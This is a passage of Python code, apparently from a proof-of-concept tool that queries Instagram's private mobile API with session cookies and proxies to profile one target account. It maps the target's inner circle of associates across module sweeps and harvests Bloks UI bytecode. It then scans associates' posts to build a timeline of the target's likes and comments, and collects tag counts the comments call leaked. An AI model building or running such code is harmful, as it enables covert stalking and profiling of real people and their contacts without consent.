        entry = {'http_status': r.status_code, 'size': len(r.text)}
        if r.status_code == 200:
            try:
                d = r.json()
                entry['user'] = d.get('user') or {}
                entry['top_level_keys'] = sorted(
                    k for k in d.keys() if k != 'user')
            except json.JSONDecodeError:
                entry['parse_error'] = True
        snapshots[module] = entry
        time.sleep(0.5)

    baseline = snapshots.get('feed_timeline') or {}
    baseline_user = baseline.get('user') or {}
    baseline_top_level = set(baseline.get('top_level_keys') or [])

    if not baseline_user:
        return {
            'error': 'baseline_failed',
            'snapshots_meta': {m: {'http_status': s.get('http_status'),
                                    'size': s.get('size')}
                                for m, s in snapshots.items()},
        }

    if baseline.get('user'):
        _save_raw(target_username, 'phase28_baseline_info.raw.json',
                   json.dumps({'user': baseline['user']},
                                ensure_ascii=False, default=str))

    deltas = {}
    for module, snap in snapshots.items():
        if module == 'feed_timeline':
            continue
        u = snap.get('user') or {}
        if not u:
            deltas[module] = {'http_status': snap.get('http_status'),
                               'size': snap.get('size'),
                               'no_user_object': True}
            continue

        diff = _diff_user_objects(baseline_user, u)
        new_top_level = (set(snap.get('top_level_keys') or [])
                          - baseline_top_level)

        deltas[module] = {
            'http_status': snap.get('http_status'),
            'size': snap.get('size'),
            'size_delta': snap.get('size', 0) - baseline.get('size', 0),
            'new_top_level_keys': sorted(new_top_level),
            **diff,
        }

        has_signal = bool(
            diff['new_keys'] or diff['list_set_diffs']
            or diff['length_changes'] or diff['dict_subkey_diffs']
            or diff['scalar_changes'] or new_top_level)
        if has_signal:
            try:
                _save_raw(target_username,
                            f'phase28_module_{module}.raw.json',
                            json.dumps({'user': u,
                                        'top_level_keys': snap.get(
                                            'top_level_keys')},
                                        ensure_ascii=False, default=str))
            except (TypeError, ValueError):
                pass

                                                                        
    successful_modules = [
        module for module, snap in snapshots.items()
        if isinstance(snap.get('user'), dict) and bool(snap.get('user'))
    ]
    cluster_union = {}                                    
    for module, snap in snapshots.items():
        u = snap.get('user') or {}
        chain = u.get('chaining_results') or u.get('chaining_suggestions') or []
        pk_to_un = _list_pk_to_username(chain)
        for pk, un in pk_to_un.items():
            entry = cluster_union.setdefault(
                pk, {'username': un, 'source_modules': []})
            if module not in entry['source_modules']:
                entry['source_modules'].append(module)
            if un and not entry.get('username'):
                entry['username'] = un

    baseline_chain = baseline_user.get('chaining_results') or []
    baseline_chain_pks = set(_list_pk_to_username(baseline_chain).keys())
    cluster_new = sorted(set(cluster_union.keys()) - baseline_chain_pks)

                                                                   
    bio_links_union = {}                                    
    for module, snap in snapshots.items():
        u = snap.get('user') or {}
        for link in (u.get('bio_links') or []):
            if not isinstance(link, dict):
                continue
            lid = link.get('link_id')
            if lid is None:
                continue
            entry = bio_links_union.setdefault(
                str(lid),
                {'url': link.get('url'), 'title': link.get('title'),
                 'link_type': link.get('link_type'),
                 'source_modules': []})
            if module not in entry['source_modules']:
                entry['source_modules'].append(module)

    return {
        'snapshots_meta': {m: {'http_status': s.get('http_status'),
                                'size': s.get('size')}
                            for m, s in snapshots.items()},
        'baseline_module': 'feed_timeline',
        'baseline_size': baseline.get('size'),
        'module_deltas': deltas,
        'cluster_union': cluster_union,
        'requested_module_count': len(INFO_MODULE_SWEEPS),
        'successful_module_count': len(successful_modules),
        'successful_modules': successful_modules,
        'cluster_baseline_count': len(baseline_chain_pks),
        'cluster_union_count': len(cluster_union),
        'cluster_new_pks': cluster_new,
        'cluster_new_count': len(cluster_new),
        'bio_links_union': bio_links_union,
    }


def parse_bloks_bytecode(text):
    out = {
        'unique_field_ids': [],
        'field_id_refcount': {},
        'top_field_ids': [],
        'action_types': {},
        'bound_constants': [],
        'rendered_text_strings': [],
        'eligibility_flags': {},
    }
                                   
    for m in re.finditer(r'"b:(\d+)"', text):
        fid = int(m.group(1))
        out['field_id_refcount'][fid] = out['field_id_refcount'].get(fid, 0) + 1
    out['unique_field_ids'] = sorted(out['field_id_refcount'].keys())
    out['top_field_ids'] = sorted(
        out['field_id_refcount'].items(), key=lambda x: -x[1])[:30]

                                                                                
    for m in re.finditer(r'"bk\.action\.([a-z][a-z_\.]+)"', text):
        a = m.group(1)
        out['action_types'][a] = out['action_types'].get(a, 0) + 1

                                          
    for m in re.finditer(
            r'"bk\.bound-tree\.constant\.(\w+)"\s*,\s*'
            r'(?:"([^"]{1,80})"|(\d+(?:\.\d+)?)|(true|false))', text):
        out['bound_constants'].append({
            'type': m.group(1),
            'value': (m.group(2) or m.group(3) or m.group(4)),
        })

                                                                                
    KEYWORDS = (
        'joined', 'created', 'based', 'located', 'active since', 'changed',
        'verified', 'türkiye', 'turkey', 'years ago', 'months ago', 'days ago',
        'follows you', 'mutual', 'shared', 'former', 'previously',
        'restricted', 'blocked', 'reported', 'business', 'creator',
        'subscribed', 'paid', 'partnership', 'government', 'state media',
        'professional', 'category', 'birthday', 'age', 'under 18',
        'minor', 'supervised', 'parent', 'family', 'whatsapp', 'threads',
    )
    for m in re.finditer(r'"text"\s*:\s*"([^"]{8,160})"', text):
        s = m.group(1)
        sl = s.lower()
        if any(kw in sl for kw in KEYWORDS):
            if s not in out['rendered_text_strings']:
                out['rendered_text_strings'].append(s)

                                                                                  
    for m in re.finditer(
            r'"(is_[a-z_]+_eligible|can_[a-z_]+|has_[a-z_]+|'
            r'should_show_[a-z_]+)"\s*:\s*(true|false)', text):
        out['eligibility_flags'][m.group(1)] = (m.group(2) == 'true')

    out['unique_field_id_count'] = len(out['unique_field_ids'])
    out['unique_action_count'] = len(out['action_types'])
    return out


def run_bloks_bytecode_harvest(target_pk, target_username, cookies, proxies=None):
    headers = _headers(cookies)
    intel = {}
    for app_name in BLOKS_TARGET_APPS:
        params = json.dumps({
            'user_id': str(target_pk),
            'reported_user_id': str(target_pk),
            'target_user_id': str(target_pk),
        })
                                                                                
                                            
        from urllib.parse import quote
        url = (f'https://i.instagram.com/api/v1/bloks/apps/{app_name}/'
                f'?params={quote(params)}')
        try:
            r = requests.get(url, headers=headers, cookies=cookies,
                              timeout=20, proxies=proxies)
        except requests.exceptions.RequestException as e:
            intel[app_name] = {'error': type(e).__name__}
            continue
        entry = {'http_status': r.status_code, 'size': len(r.text)}
        if r.status_code == 200 and len(r.text) > 200:
            entry['bytecode'] = parse_bloks_bytecode(r.text)
            if entry['bytecode']['unique_field_id_count'] > 0:
                _save_raw(target_username, f'bloks_{app_name.split(".")[-1]}.raw.json',
                          r.text)
        intel[app_name] = entry
        bc = entry.get('bytecode') or {}
        print(f'  [{r.status_code}] {app_name.split(".")[-1]}: '
              f'{len(r.text)}B fields={bc.get("unique_field_id_count", 0)} '
              f'actions={bc.get("unique_action_count", 0)} '
              f'eligibility={len(bc.get("eligibility_flags", {}))}')
        time.sleep(0.5)
    return intel


def aggregate_bloks_intel(bloks_intel):
    """Tüm bloks app'lerinden gelen field id, eligibility, text setlerini
    birleştir. Bu set target hakkındaki UI conditional logic'inin tüm
    tetikleyicilerini açar."""
    all_fields = {}
    all_actions = {}
    all_eligibility = {}
    all_texts = []
    for app, entry in bloks_intel.items():
        bc = entry.get('bytecode') or {}
        for fid, cnt in bc.get('field_id_refcount', {}).items():
            all_fields[fid] = all_fields.get(fid, 0) + cnt
        for a, cnt in bc.get('action_types', {}).items():
            all_actions[a] = all_actions.get(a, 0) + cnt
        for k, v in bc.get('eligibility_flags', {}).items():
            all_eligibility.setdefault(k, []).append({'app': app, 'value': v})
        for s in bc.get('rendered_text_strings', []):
            if s not in all_texts:
                all_texts.append(s)
    return {
        'unique_field_id_set': sorted(all_fields.keys()),
        'top_field_ids': sorted(all_fields.items(), key=lambda x: -x[1])[:50],
        'unique_actions': sorted(all_actions.keys()),
        'top_actions': sorted(all_actions.items(), key=lambda x: -x[1])[:30],
        'eligibility_flags': all_eligibility,
        'rendered_text_strings': all_texts,
        'totals': {
            'unique_fields': len(all_fields),
            'unique_actions': len(all_actions),
            'unique_eligibility': len(all_eligibility),
            'rendered_texts': len(all_texts),
        },
    }


def run_phase28(target_username, target_pk, cookies, proxies=None):
    print(f'[*] Phase 28: FROM_MODULE SWEEP + BLOKS BYTECODE pk={target_pk}')
    intel = {'pk': str(target_pk), 'ts_run': time.time()}

    print(f'  [1/2] from_module sweep ({len(INFO_MODULE_SWEEPS)} module '
           f'× /info/ deep diff)...')
    intel['module_sweep'] = run_from_module_sweep(
        target_pk, target_username, cookies, proxies)
    ms = intel['module_sweep']
    if ms.get('error'):
        print(f'        baseline failed: {ms.get("error")}')
    else:
        print(f'        baseline=feed_timeline size={ms["baseline_size"]}B '
               f'cluster={ms["cluster_baseline_count"]}')
        for module, delta in ms['module_deltas'].items():
            if delta.get('no_user_object'):
                print(f'        [{delta.get("http_status")}] '
                       f'{module:<32} no user obj '
                       f'({delta.get("size", 0)}B)')
                continue
            nk = len(delta['new_keys'])
            mk = len(delta['missing_keys'])
            lset = delta['list_set_diffs']
            llen = delta['length_changes']
            dsub = delta['dict_subkey_diffs']
            scalars = delta['scalar_changes']
            ntop = delta['new_top_level_keys']

                                                                            
            chain_added = (lset.get('chaining_results') or {}).get(
                'added_count', 0)

            has_strong_signal = bool(
                nk or ntop or chain_added or dsub or scalars)
            marker = '**' if has_strong_signal else (' .' if not lset else ' +')
            print(f'        {marker} {module:<32} sz={delta["size"]}B '
                   f'(d{delta["size_delta"]:+d})  new_keys={nk} '
                   f'miss={mk} list_diffs={len(lset)} '
                   f'len_chg={len(llen)} dict_chg={len(dsub)} '
                   f'scalar_chg={len(scalars)}')
            if ntop:
                print(f'              top_level+= {ntop}')
            if chain_added:
                added = lset['chaining_results']['added'][:8]
                cluster = ms['cluster_union']
                preview = ', '.join(
                    f'@{cluster.get(p, {}).get("username") or p}'
                    for p in added)
                print(f'              chaining+= {chain_added} new pks: '
                       f'{preview}')
            for k, info in list(lset.items())[:3]:
                if k == 'chaining_results':
                    continue
                if info['added_count']:
                    print(f'              {k}+= {info["added_count"]} '
                           f'new ids')
            for k, info in list(dsub.items())[:3]:
                if info['new_sub_keys']:
                    print(f'              {k}.new_sub= '
                           f'{info["new_sub_keys"][:6]}')
            for k, v in list(scalars.items())[:3]:
                print(f'              ~ {k}: {v["baseline"][:50]} '
                       f'→ {v["module"][:50]}')

                                                      
                                                                             
                                                                            
                                                                    
        requested_mods = int(ms.get('requested_module_count') or
                             len(INFO_MODULE_SWEEPS))
        n_mods = max(1, int(ms.get('successful_module_count') or 1))
        threshold_stable = n_mods                  
        threshold_strong = max(1, int(n_mods * 0.75))        

        stable_inner = [(pk, info) for pk, info in ms['cluster_union'].items()
                          if len(info['source_modules']) >= threshold_stable]
        strong_inner = [(pk, info) for pk, info in ms['cluster_union'].items()
                          if threshold_strong <= len(
                              info['source_modules']) < threshold_stable]
        weak_sampled = [(pk, info) for pk, info in ms['cluster_union'].items()
                          if len(info['source_modules']) < threshold_strong]

        cu_count = ms['cluster_union_count']
        cb_count = ms['cluster_baseline_count']
        print(f'\n  [+] CLUSTER UNION (this run): baseline_sample={cb_count} → '
               f'union={cu_count} ({n_mods}/{requested_mods} successful modules)')
        print(f'      stable_inner_circle  ({n_mods}/{n_mods} modules): '
               f'{len(stable_inner):>3} hesap  [sample-stable]')
        print(f'      strong_signal       (>={threshold_strong}/{n_mods}): '
               f'{len(strong_inner):>3} hesap  [yuksek confidence]')
        print(f'      weak_sampled         (<{threshold_strong}/{n_mods}): '
               f'{len(weak_sampled):>3} hesap')

                                                                            
                                                                            
                                                                        
        cu_existing_path = os.path.join(
            ARTIFACT_ROOT, target_username, 'cluster_union.json')
        cu_merged = dict(ms['cluster_union'])
        merge_stats = {'previous_size': 0, 'newly_added': 0, 'enriched': 0,
                        'previous_runs': []}
        if os.path.exists(cu_existing_path):
            try:
                with open(cu_existing_path, encoding='utf-8') as f:
                    cu_old = json.load(f)
                old_cluster = cu_old.get('cluster') or {}
                merge_stats['previous_size'] = len(old_cluster)
                merge_stats['previous_runs'] = (cu_old.get('run_history')
                                                  or [])
                for pk, info in old_cluster.items():
                    if pk not in cu_merged:
                        cu_merged[pk] = info
                    else:
                                           
                        old_mods = info.get('source_modules') or []
                        for mod in old_mods:
                            if mod not in cu_merged[pk]['source_modules']:
                                cu_merged[pk]['source_modules'].append(mod)
                                                                         
                        for k in ('username', 'full_name', 'is_private',
                                   'is_verified', 'social_context',
                                   'context_class'):
                            if (info.get(k) is not None and
                                    not cu_merged[pk].get(k)):
                                cu_merged[pk][k] = info[k]
                                merge_stats['enriched'] += 1
                merge_stats['newly_added'] = (len(cu_merged) -
                                                merge_stats['previous_size'])
            except (OSError, json.JSONDecodeError):
                pass

                                                         
        merged_stable = [(pk, info) for pk, info in cu_merged.items()
                          if len(info.get('source_modules') or []) >= threshold_stable]
        merged_strong = [(pk, info) for pk, info in cu_merged.items()
                          if threshold_strong <= len(
                              info.get('source_modules') or []) < threshold_stable]
        merged_weak = [(pk, info) for pk, info in cu_merged.items()
                        if len(info.get('source_modules') or []) < threshold_strong]

        run_history = list(merge_stats['previous_runs'])
        run_history.append({
            'ts_run': time.time(),
            'sweep_modules_count': n_mods,
            'requested_sweep_modules_count': requested_mods,
            'baseline_count': cb_count,
            'this_run_unique': len(ms['cluster_union']),
            'after_merge_total': len(cu_merged),
        })

        cu_path = _save_json(
            target_username, 'cluster_union.json',
            {'pk': str(target_pk),
             'ts_run': time.time(),
             'sweep_modules_count': n_mods,
             'requested_sweep_modules_count': requested_mods,
             'successful_sweep_modules': ms.get('successful_modules') or [],
             'baseline_sample_count': cb_count,
             'union_count': len(cu_merged),
             'this_run_count': len(ms['cluster_union']),
                                                                         
                                                                             
                                                                        
             'current_run_cluster': ms['cluster_union'],
             'stable_inner_circle': dict(merged_stable),
             'strong_signal': dict(merged_strong),
             'weak_sampled': dict(merged_weak),
             'cluster': cu_merged,
             'merge_stats': merge_stats,
             'run_history': run_history})
        print(f'      saved -> {os.path.relpath(cu_path)}')
        if merge_stats['previous_size'] > 0:
            print(f'      [MERGE] previous={merge_stats["previous_size"]} '
                   f'+new={merge_stats["newly_added"]} '
                   f'enriched_fields={merge_stats["enriched"]} '
                   f'→ total={len(cu_merged)} (run #{len(run_history)})')

        print(f'\n  [+] STABLE INNER CIRCLE ({len(stable_inner)} '
               f'hesap, her run\'da görünen):')
        for pk, info in stable_inner:
            un = info.get('username') or '?'
            print(f'      @{un:<30} pk={pk}')

        if strong_inner:
            print(f'\n  [+] STRONG SIGNAL (>={threshold_strong}/15 modules, '
                   f'{len(strong_inner)} hesap):')
            for pk, info in strong_inner:
                un = info.get('username') or '?'
                mods_n = len(info['source_modules'])
                print(f'      @{un:<30} pk={pk:<14} {mods_n}/15')

                                                          
                                                                              
                                                                           
                                                                            
                                                                         

                                                                 
        if ms['bio_links_union']:
            print(f'\n  [+] BIO LINKS UNION: '
                   f'{len(ms["bio_links_union"])} unique link_id '
                   f'(deterministik, sampling noise yok)')
            for lid, info in list(ms['bio_links_union'].items())[:10]:
                mods_n = len(info['source_modules'])
                title = (info.get('title') or '')[:30]
                url = (info.get('url') or '')[:60]
                print(f'      [{mods_n}m] {lid} {title} -> {url}')

    print(f'\n  [2/2] Bloks bytecode harvest (14 app)...')
    intel['bloks_apps'] = run_bloks_bytecode_harvest(
        target_pk, target_username, cookies, proxies)
    intel['bloks_aggregate'] = aggregate_bloks_intel(intel['bloks_apps'])

    bagg = intel['bloks_aggregate']
    print(f'\n  [+] BLOKS AGGREGATE: '
          f'fields={bagg["totals"]["unique_fields"]} '
          f'actions={bagg["totals"]["unique_actions"]} '
          f'eligibility={bagg["totals"]["unique_eligibility"]} '
          f'texts={bagg["totals"]["rendered_texts"]}')

                                                                             
                                                                              
    if bagg['rendered_text_strings']:
        print(f'\n  [+] RENDERED TEXT (target-specific UI strings):')
        for s in bagg['rendered_text_strings'][:20]:
            print(f'      "{s[:120]}"')

    if bagg['eligibility_flags']:
        print(f'\n  [+] ELIGIBILITY FLAGS (target için açık/kapalı UI yetkileri):')
        for k, vlist in list(bagg['eligibility_flags'].items())[:25]:
            vals = list({str(v["value"]) for v in vlist})
            print(f'      {k} = {",".join(vals)}')

    path = _save_json(target_username, 'inflation_bloks.json', intel)
    print(f'  → {path}')
    return intel


                                                                               
                                                      
                                                                               
                         
                                                                      
                                                    
                                            
                                                                        
                                                                        
                                                

def load_chaining_cluster(target_username):
    """Phase 17/14/28v3'ten cluster pk listesi yükle.

    cluster_union.json (Phase 28 v3 çıktısı) farklı şekilde yapılı:
        {"cluster": {"<pk>": {"username": "...", "source_modules": [...]}, ...}}
    pk dict'in KEY'inde — walk fonksiyonu key+value'yu birlikte değerlendirmeli.

    Diğer dosyalar (expanded_chaining_all_modules, critical_intel) embedded
    {pk:..., username:...} pattern'i kullanıyor.
    """
    candidate_paths = [
        os.path.join(ARTIFACT_ROOT, target_username,
                      'expanded_chaining_all_modules.json'),
        os.path.join(ARTIFACT_ROOT, target_username, 'chaining_results.json'),
        os.path.join(ARTIFACT_ROOT, target_username, 'cluster_union.json'),
        os.path.join(ARTIFACT_ROOT, target_username, 'critical_intel.json'),
    ]
    cluster = {}              

    def _add(pk, info_dict, source):
        pk_s = str(pk)
        if not pk_s or not pk_s.isdigit() or pk_s in cluster:
            return
        cluster[pk_s] = {
            'username': (info_dict.get('username')
                          if isinstance(info_dict, dict) else None),
            'is_private': (info_dict.get('is_private')
                            if isinstance(info_dict, dict) else None),
            'is_verified': (info_dict.get('is_verified')
                              if isinstance(info_dict, dict) else None),
            'source_path': source,
        }

    for p in candidate_paths:
        if not os.path.exists(p):
            continue
        try:
            with open(p, encoding='utf-8') as f:
                d = json.load(f)
        except (OSError, json.JSONDecodeError):
            continue
        source = os.path.basename(p)

                                                        
        if source == 'cluster_union.json' and isinstance(d, dict):
            for bucket_key in ('stable_inner_circle', 'strong_signal',
                                 'weak_sampled', 'cluster'):
                bucket = d.get(bucket_key) or {}
                if not isinstance(bucket, dict):
                    continue
                for pk_key, info in bucket.items():
                    _add(pk_key, info or {}, source)
            continue

                                                                           
        def walk(o):
            if isinstance(o, dict):
                pk = o.get('pk') or o.get('pk_id') or o.get('id')
                un = o.get('username')
                if pk and un:
                    _add(pk, o, source)
                for v in o.values():
                    walk(v)
            elif isinstance(o, list):
                for it in o:
                    walk(it)

        walk(d)
    return cluster


def harvest_target_interactions_on_account(account_pk, account_username,
                                              target_pk, cookies, proxies,
                                              max_media):
    """Tek bir cluster account'unda: post listesini al, her post için
    likers + comments tara, target_pk filtre uygula."""
    headers = _headers(cookies)
    feed_url = (f'https://i.instagram.com/api/v1/feed/user/{account_pk}/'
                 f'?count={max_media}')
    likes = []
    comments = []
    media_scanned = 0
    try:
        r = requests.get(feed_url, headers=headers, cookies=cookies,
                          timeout=20, proxies=proxies)
        if r.status_code != 200:
            return likes, comments, media_scanned, f'feed_status={r.status_code}'
        items = (r.json().get('items') or [])
    except (requests.exceptions.RequestException, json.JSONDecodeError) as e:
        return likes, comments, media_scanned, f'feed_error={type(e).__name__}'

    target_pk_str = str(target_pk)
    for media in items[:max_media]:
        media_scanned += 1
        mid = media.get('id') or media.get('pk')
        if not mid:
            continue
        code = media.get('code') or ''
        taken_at = media.get('taken_at')
        caption_head = ((media.get('caption') or {}).get('text') or '')[:80]
        media_url = f'https://www.instagram.com/p/{code}/' if code else None

                
        try:
            rl = requests.get(
                f'https://i.instagram.com/api/v1/media/{mid}/likers/',
                headers=headers, cookies=cookies, timeout=15, proxies=proxies)
            if rl.status_code == 200:
                ld = rl.json()
                for u in (ld.get('users') or []):
                    if str(u.get('pk')) == target_pk_str:
                        likes.append({
                            'media_id': str(mid),
                            'media_code': code,
                            'media_owner_pk': str(account_pk),
                            'media_owner_username': account_username,
                            'media_taken_at_ts': taken_at,
                            'media_taken_at_iso': _ts_iso(taken_at, 's'),
                            'media_caption_head': caption_head,
                            'media_url': media_url,
                        })
                        break
        except (requests.exceptions.RequestException, json.JSONDecodeError):
            pass
        time.sleep(0.25)

                  
        try:
            rc = requests.get(
                f'https://i.instagram.com/api/v1/media/{mid}/comments/'
                f'?can_support_threading=true&permalink_enabled=false',
                headers=headers, cookies=cookies, timeout=15, proxies=proxies)
            if rc.status_code == 200:
                cd = rc.json()
                for c in (cd.get('comments') or []):
                    if str((c.get('user') or {}).get('pk')) == target_pk_str:
                        comments.append({
                            'media_id': str(mid),
                            'media_code': code,
                            'media_owner_pk': str(account_pk),
                            'media_owner_username': account_username,
                            'media_taken_at_ts': taken_at,
                            'comment_text': (c.get('text') or '')[:300],
                            'comment_ts': c.get('created_at'),
                            'comment_iso': _ts_iso(c.get('created_at'), 's'),
                            'comment_pk': c.get('pk'),
                            'comment_like_count': c.get('comment_like_count'),
                            'media_url': media_url,
                        })
        except (requests.exceptions.RequestException, json.JSONDecodeError):
            pass
        time.sleep(0.25)

    return likes, comments, media_scanned, None


def run_phase29(target_username, target_pk, cookies, proxies=None,
                 max_accounts=20, max_media=12):
    print(f'[*] Phase 29: COMMENT/LIKE ARCHEOLOGY pk={target_pk}')

    cluster = load_chaining_cluster(target_username)
    cluster.pop(str(target_pk), None)
    if not cluster:
        print('  [-] Cluster yok. Önce ana poc.py\'yi auth+pk ile koş '
               '(Phase 14/17 cluster oluşturuyor).')
        return None

                                                    
    cluster_sorted = sorted(
        cluster.items(),
        key=lambda kv: (kv[1].get('is_private') is True, kv[0]))
    cluster_subset = cluster_sorted[:max_accounts]

    print(f'  [.] cluster size: {len(cluster)} accounts | '
          f'taranacak: {len(cluster_subset)} × {max_media} media')

    all_likes = []
    all_comments = []
    per_account = []
    for idx, (pk, info) in enumerate(cluster_subset, 1):
        if info.get('is_private') is True:
            per_account.append({
                'pk': pk, 'username': info.get('username'),
                'skipped': 'private', 'media_scanned': 0,
                'likes_found': 0, 'comments_found': 0,
            })
            print(f'  [{idx}/{len(cluster_subset)}] @{info.get("username")} '
                  f'(pk={pk}) → SKIP (private)')
            continue

        likes, comments, scanned, err = harvest_target_interactions_on_account(
            pk, info.get('username'), target_pk, cookies, proxies, max_media)
        all_likes.extend(likes)
        all_comments.extend(comments)
        per_account.append({
            'pk': pk, 'username': info.get('username'),
            'media_scanned': scanned,
            'likes_found': len(likes),
            'comments_found': len(comments),
            'error': err,
        })
        marker = '✓' if (likes or comments) else ('!' if err else '·')
        print(f'  [{marker}] [{idx}/{len(cluster_subset)}] '
              f'@{info.get("username")} (pk={pk}): '
              f'{scanned} media | L={len(likes)} C={len(comments)}'
              + (f' err={err}' if err else ''))

                          
    events = []
    for ev in all_likes:
        events.append(('like', ev.get('media_taken_at_ts') or 0, ev))
    for ev in all_comments:
        ts = ev.get('comment_ts') or ev.get('media_taken_at_ts') or 0
        events.append(('comment', ts, ev))
    events.sort(key=lambda x: x[1])

    intel = {
        'pk': str(target_pk),
        'ts_run': time.time(),
        'cluster_size': len(cluster),
        'accounts_attempted': len(cluster_subset),
        'per_account': per_account,
        'total_likes': len(all_likes),
        'total_comments': len(all_comments),
        'likes': all_likes,
        'comments': all_comments,
        'timeline': [
            {'kind': k, 'ts': t, 'iso': _ts_iso(t, 's'), 'data': d}
            for k, t, d in events
        ],
    }

                    
    if events:
        first_ts = events[0][1]
        last_ts = events[-1][1]
        if first_ts and last_ts and first_ts > 0:
            intel['first_interaction_iso'] = _ts_iso(first_ts, 's')
            intel['last_interaction_iso'] = _ts_iso(last_ts, 's')
            intel['interaction_span_days'] = round(
                (last_ts - first_ts) / 86400, 1)
                                              
            owner_count = {}
            for _, _, ev in events:
                key = ev.get('media_owner_username') or ev.get('media_owner_pk')
                owner_count[key] = owner_count.get(key, 0) + 1
            intel['top_interacted_owners'] = sorted(
                owner_count.items(), key=lambda x: -x[1])[:10]

          
    print(f'\n  [+] DEFINITIVE TARGET INTERACTIONS:')
    print(f'      total_likes    = {intel["total_likes"]}')
    print(f'      total_comments = {intel["total_comments"]}')
    if intel.get('first_interaction_iso'):
        print(f'      span: {intel["first_interaction_iso"]} → '
              f'{intel["last_interaction_iso"]} '
              f'({intel.get("interaction_span_days")} days)')
    for owner, cnt in (intel.get('top_interacted_owners') or [])[:5]:
        print(f'      top: @{owner} = {cnt} interactions')

                            
    if events:
        print(f'\n  [+] LATEST 5 INTERACTIONS:')
        for k, t, d in events[-5:]:
            iso = _ts_iso(t, 's')
            owner = d.get('media_owner_username')
            if k == 'like':
                print(f'      {iso} LIKE → @{owner} | {d.get("media_url")}')
            else:
                txt = (d.get('comment_text') or '')[:60]
                print(f'      {iso} COMMENT → @{owner} | "{txt}" | '
                      f'{d.get("media_url")}')

    path = _save_json(target_username, 'archeology_phase29.json', intel)
    print(f'  → {path}')
    return intel


                                                                               
                                
                                                                               
                                                        
                                                 
 
                                                                           
                                                                       
                                                                         
                                                                             
                             
 
                                           
                                                                               
                               
                                                                     
                                                                  
                                                                       
                                                                          
                                         

_TAG_META_FIELDS = (
    'is_private', 'is_verified', 'follower_count', 'following_count',
    'media_count', 'usertags_count', 'should_show_tagged_tab',
    'show_mentions_banner_on_profile', 'is_new_to_instagram',
    'has_user_tagged_count', 'show_account_transparency_details',
    'has_chaining', 'has_active_tags_for_owner',
    'allowed_commenter_type', 'reachability_status',
    'has_private_collections', 'show_post_insights_entry_point',
    'show_text_post_app_switcher_badge', 'show_text_post_app_badge',
    'show_blue_badge_on_main_profile', 'allow_manage_memorialization',
    'show_fb_link_on_profile', 'show_fb_page_link_on_profile',
    'show_wa_link_on_profile', 'show_events_banner_on_profile',
    'is_eligible_for_meta_verified_label',
    'is_eligible_for_meta_verified_subscription',
    'show_ig_app_switcher_badge',
)


def harvest_target_tagged_metadata(target_pk, target_username, cookies,
                                       proxies=None):
    """Phase 30 step 0: target'ın /info/ ve HTML SSR'dan tag-related metadata
    leak'lerini topla. UI bu alanların hiçbirini göstermez.
    Throttle koruması: önce live /info/'yu dene, eğer < 50 alan dönerse
    diskteki phase28_baseline_info.raw.json'dan fallback yap."""
    headers = _headers(cookies)
    out = {}
    user_obj = None
    out['source'] = 'live'

    url = (f'https://i.instagram.com/api/v1/users/{target_pk}/info/'
            f'?include_user_tagged_count=true'
            f'&include_user_tagged_media=true'
            f'&from_module=feed_timeline')
    try:
        r = requests.get(url, headers=headers, cookies=cookies,
                          timeout=15, proxies=proxies)
        if r.status_code == 200:
            u = (r.json().get('user') or {})
            if len(u) >= 50:
                user_obj = u
            else:
                out['live_throttled'] = (
                    f'live /info/ returned {len(u)} keys '
                    f'(throttled, kullanıcı normalde 200+)')
    except (requests.exceptions.RequestException,
             json.JSONDecodeError) as e:
        out['info_error'] = type(e).__name__

                                                   
    if user_obj is None:
        cache_paths = [
            os.path.join(ARTIFACT_ROOT, target_username,
                          'phase28_baseline_info.raw.json'),
            os.path.join(ARTIFACT_ROOT, target_username,
                          'critical_intel.json'),
        ]
        for cp in cache_paths:
            if not os.path.exists(cp):
                continue
            try:
                with open(cp, encoding='utf-8') as f:
                    cd = json.load(f)
            except (OSError, json.JSONDecodeError):
                continue
            cu = (cd.get('user') or
                   (cd.get('intel') or {}).get('raw_user') or
                   (cd.get('intel') or {}).get('full_response_user') or
                   {})
            if isinstance(cu, dict) and len(cu) >= 50:
                user_obj = cu
                out['source'] = f'cache:{os.path.basename(cp)}'
                break

    if user_obj:
        for k in _TAG_META_FIELDS:
            if k in user_obj:
                out[k] = user_obj[k]
        if 'nametag' in user_obj:
            out['nametag'] = user_obj['nametag']

                                                                          
    h_html = {
        'user-agent': ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                        'AppleWebKit/537.36 (KHTML, like Gecko) '
                        'Chrome/130.0.0.0 Safari/537.36'),
        'accept': 'text/html,application/xhtml+xml',
        'accept-language': 'en-US,en;q=0.9',
    }
    try:
        r = requests.get(
            f'https://www.instagram.com/{target_username}/tagged/',
            headers=h_html, cookies=cookies, timeout=15,
            allow_redirects=False, proxies=proxies)
        out['html_tagged_status'] = r.status_code
        out['html_tagged_size'] = len(r.text)
        location = r.headers.get('Location')
        sc = r.headers.get('Set-Cookie') or ''
        if location:
            out['html_tagged_redirect'] = location
        if 'sessionid=deleted' in sc:
            out['html_tagged_gating'] = (
                'forced_logout: IG sessionid=deleted cookie attempt — '
                'viewer-side gating active')
        elif r.status_code == 200 and len(r.text) > 1000:
                                                             
            codes = re.findall(
                r'"shortcode"\s*:\s*"([A-Za-z0-9_-]{8,12})"', r.text)
            if codes:
                out['html_tagged_shortcodes'] = list(
                    dict.fromkeys(codes))[:20]
    except requests.exceptions.RequestException as e:
        out['html_tagged_error'] = type(e).__name__

    return out


def harvest_usertags_feed(target_pk, cookies, proxies=None,
                            max_count=50, max_pages=3):
    """Phase 30 step A: /api/v1/usertags/{pk}/feed/ direkt endpoint.
    Genelde gated dönüyor (items:[]) ama yanıttaki `total_count` leaked
    metadata — target'ın TAG'LENME SAYISI. UI bunu hiçbir hesap için
    göstermez."""
    headers = _headers(cookies)
    out = {
        'pk': str(target_pk),
        'pages_fetched': 0,
        'total_items': 0,
        'leaked_total_count': None,
        'requires_review': None,
        'items': [],
        'co_tagged_users': {},                          
        'taggers': {},                                                              
        'locations': [],                                        
    }
    max_id = None
    for page in range(max_pages):
        params = f'count={max_count}'
        if max_id:
            params += f'&max_id={max_id}'
        url = (f'https://i.instagram.com/api/v1/usertags/{target_pk}/feed/'
                f'?{params}')
        try:
            r = requests.get(url, headers=headers, cookies=cookies,
                              timeout=20, proxies=proxies)
        except requests.exceptions.RequestException as e:
            out[f'error_page_{page}'] = type(e).__name__
            break
        if r.status_code != 200:
            out[f'error_page_{page}'] = f'http_{r.status_code}'
            out['last_response_head'] = r.text[:200]
            break
        try:
            d = r.json()
        except json.JSONDecodeError:
            out[f'error_page_{page}'] = 'json_decode'
            break
        items = d.get('items') or []
                                                               
        if page == 0:
            out['leaked_total_count'] = d.get('total_count')
            out['requires_review'] = d.get('requires_review')
        if not items:
